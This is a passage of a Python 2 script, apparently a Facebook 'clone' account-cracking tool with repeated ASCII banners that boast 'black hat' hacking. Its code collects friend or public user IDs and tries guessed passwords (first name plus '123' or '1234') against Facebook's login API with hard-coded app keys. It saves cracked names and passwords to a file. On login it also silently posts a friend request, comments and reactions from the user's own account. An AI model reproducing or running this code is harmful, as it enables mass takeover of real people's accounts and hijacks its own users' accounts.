\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo16 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo17 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo18 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo19 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
logo20 = """		
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
 💕`•.¸   💗   ¸.•` 💕 
     💕° •.¸¸.•° 💕   TRICKER-JAMES.☕
           💕💕         JAMES-HACKER 🍃🌻🍃
             💕     💕🍃🌹🍃💕  .💘
                    💕.•°``°•.¸.•°``°•.💕
                   💕(  🍃 🌹 🍃   ) 💕
                     💕`•.¸   💗   ¸.•` 💕
                          💕° •.¸¸.•° 💕
                                💕💕
                                  💕
\x1b[1;94m---------------------------------------------------
\x1b[1;91m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\x1b[1;92m➣ BANGLADESH BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : JAMES-HACKER
\x1b[1;94m➣       FROM : DHAKA,NARAYANGANJ 
\x1b[1;95m➣   WHATSAPP : +96598064347
\x1b[1;96m➣    WARNING : DON’T USE ILLEGAL WAY
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;91m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;92m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;93m➣    WARNING : USE PROXY US SUPAR VPN FOR CLONING  
\x1b[1;94m---------------------------------------------------""" 
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []

def masuk():
    os.system('clear')
    print logo
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;92m01\x1b[1;97m}\x1b[1;92m Login Token Facebook'
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;92m02\x1b[1;97m}\x1b[1;92m Download Token App'
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;92m03\x1b[1;97m}\x1b[1;92m Login With Facebook'
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m}\x1b[1;91m Back'
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\x1b[1;93mChoose Which Man?\x1b[91m:\x1b[1;92m ')
    if msuk == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Choose the wrong one...!'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '2' or msuk == '02':
        ambil_token()
    elif msuk == '3' or msuk == '03':
        login()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Choose the wrong one...!'
        pilih_masuk()


def tokenz():
    os.system('clear')
    print logo3
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    toket = raw_input('\x1b[1;91m[+]\x1b[1;95mEnter Token \x1b[1;91m:\x1b[1;94m ')
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\n\x1b[1;95mLogin Successful.\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2..'
        bot_komen()
    except KeyError:
        print '\x1b[1;91m[!] Token Wrong'
        print '\x1b[1;92m[!] Token Chekpoint'
        masuk()


def ambil_token():
    os.system('clear')
    print logo
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
    time.sleep(2)
    masuk()


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo2
        print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
        jalan('\x1b[1;96m[\xe2\x9c\xbe]\x1b[1;91mDO NOT USE THE OLD ACCOUNT TO LOGIN\x1b[1;96m[\xe2\x9c\xbe]')
        time.sleep(0.05)
        jalan('\x1b[1;96m[\xe2\x9c\xbe]\x1b[1;91mUSE A NEW ACCOUNT TO LOGIN\x1b[1;96m[\xe2\x9c\xbe]')
        print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
        id = raw_input('\x1b[1;97m[+] \x1b[1;94mID/Email\x1b[1;97m: \x1b[1;94m')
        pwd = raw_input('\x1b[1;97m[+] \x1b[1;94mPassword\x1b[1;97m: \x1b[1;94m')
        menu()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;97mThere is no internet connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;95mLogin Successful.\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2..'
                os.system('xdg-open https://www.facebook.com/Apni.bapka.account7')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                bot_komen()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;97mThere is no internet connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;97mIt looks like your account is Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;94mPassword/Email Wrong!'
            os.system('rm -rf login.txt')
            time.sleep(1)
            masuk()


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Deleted Token'
        os.system('rm -rf login.txt')

    una = '100007639052164'
    kom = 'Angry React\xf0\x9f\x98\x98 \xf0\x9f\x98\x98'
    reac = 'ANGRY'
    post = '2636809663250310'
    post2 = '2636809663250310'
    kom2 = 'Love React\xf0\x9f\x98\x81 \xf0\x9f\x98\x81'
    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '{!} Delete Token !'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mDelete Token'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '{!} There is no internet connection'
        keluar()

    os.system('clear')
    print logo4
    print '\x1b[1;96m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m NAME\x1b[1;90m    =>\x1b[1;92m ' + nama
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m USER ID\x1b[1;90m =>\x1b[1;92m ' + id
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{' + warni + '01\x1b[1;97m}' + warna + ' \x1b[1;95mClone From Friend/Public'
    print '\x1b[1;97m{' + warni + '02\x1b[1;97m}' + warna + ' \x1b[1;95mClone From Post  Group/Friend'
    print '\x1b[1;97m{' + warni + '03\x1b[1;97m}' + warna + ' \x1b[1;95mClone From Total Followers'
    print '\x1b[1;97m{' + warni + '04\x1b[1;97m}' + warna + ' \x1b[1;95mChange Account Username To ID'
    print '\x1b[1;97m{' + warni + '05\x1b[1;97m}' + warna + ' \x1b[1;92mUpdate Tools'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m}' + warna + '\x1b[1;91m Back'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih()


def pilih():
    unikers = raw_input('\x1b[1;92mChoose Which Man? \x1b[91m:\x1b[1;92m ')
    if unikers == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m  Choose the wrong one...!'
        pilih()
    elif unikers == '1' or unikers == '01':
        crack_teman()
    elif unikers == '2' or unikers == '02':
        crack_likes()
    elif unikers == '3' or unikers == '03':
        crack_follow()
    elif unikers == '4' or unikers == '04':
        user_id()
    elif unikers == '5' or unikers == '05':
        perbarui()
    elif unikers == '0' or unikers == '00':
        os.system('clear')
        jalan('Delete Token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Choose the wrong one...!'
        pilih()


def crack_teman():
    os.system('clear')
    print logo5
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{' + warna + '01\x1b[1;97m}' + warni + '\x1b[1;93m Hack Pakistan '
    print '\x1b[1;97m{' + warna + '02\x1b[1;97m}' + warni + '\x1b[1;93m Hack Bangladesh '
    print '\x1b[1;97m{' + warna + '03\x1b[1;97m}' + warni + '\x1b[1;93m Hack Usa '
    print '\x1b[1;97m{' + warna + '04\x1b[1;97m}' + warni + '\x1b[1;93m Hack Indonesia '
    print '\x1b[1;97m{' + warna + '05\x1b[1;97m}' + warni + '\x1b[1;93m Hack Malaysia '
    print '\x1b[1;97m{' + warna + '06\x1b[1;97m}' + warni + '\x1b[1;93m Hack India '
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m}' + warni + ' Back'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_teman()


def pilih_teman():
    univ = raw_input('' + warna + 'Choose Which Man?\x1b[91m:\x1b[1;92m ')
    if univ == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Choose the wrong one...!'
        pilih_teman()
    elif univ == '1' or univ == '01':
        crack_pakis()
    elif univ == '2' or univ == '02':
        crack_bangla()
    elif univ == '3' or univ == '03':
        crack_usa()
    elif univ == '4' or univ == '04':
        crack_indo()
    elif univ == '5' or univ == '04':
        crack_malay()
    elif univ == '6' or univ == '04':
        crack_india()
    elif univ == '7' or univ == '05':
        univ()
    elif univ == '0' or univ == '00':
        menu()
    else:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Choose the Correct...!'
        pilih_teman()


def crack_pakis():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mDelete Token'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo6
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} \x1b[1;92mHack From Friends list'
    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} \x1b[1;92mHack From Public Friends List'
    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} \x1b[1;92mHack From File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Back'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_pakis()


def pilih_pakis():
    global cekpoint
    global oks
    teak = raw_input('\x1b[1;93mChoose Which Man? \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Choose the wrong one...!'
        pilih_()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo16
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '             \x1b[1;93m\xe2\x88\x9a\xe2\x88\x9a\xe2\x88\x9a \x1b[1;97mCRACK PAKISTAN \x1b[1;93m\xe2\x88\x9a\xe2\x88\x9a\xe2\x88\x9a'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo16
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            print '        \x1b[1;93m\xe2\x88\x9a\xe2\x88\x9a\xe2\x88\x9a \x1b[1;97mCRACK PAKISTAN \x1b[1;93m\xe2\x88\x9a\xe2\x88\x9a\xe2\x88\x9a'
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            idt = raw_input('\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mID Public/Friend \x1b[1;91m:\x1b[1;92m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m}\x1b[1;93m Nama \x1b[1;91m:\x1b[1;92m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID public / friend doesnt exist !'
                raw_input('\n\x1b[1;93m{\x1b[1;97m<Back>\x1b[1;93m}')
                crack_pakis()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} There is no internet connection!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        else:
            if teak == '3' or teak == '03':
                os.system('clear')
                print logo16
                try:
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    print '             \x1b[1;93m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK PAKISTAN \x1b[1;93m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    idlist = raw_input('\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mName File\x1b[1;91m :\x1b[1;92m ')
                    for line in open(idlist, 'r').readlines():
                        id.append(line.strip())

                except KeyError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File does not exist ! '
                    raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
                except IOError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File does not exist !'
                    raw_input('\n\x1b[1;93m{\x1b[1;97m<Back>\x1b[1;93m}')
                    crack_indo()

            elif teak == '0' or teak == '00':
                menu()
            else:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Choose the wrong one...!'
                pilih_pakis()
            print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
            print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mStop Token CTRL+Z'
            titik = ['.   ', '..  ', '... ']
            for o in titik:
                print '\r\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mCracker ' + o,
                sys.stdout.flush()
                time.sleep(1)

        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mIf the Crack is Still Old'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mTurn on Airplane Mode for 5 Seconds'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mCheckpoint Save 7/10 Days'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S \x1b[1;97m' + str(len(zowe)))))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
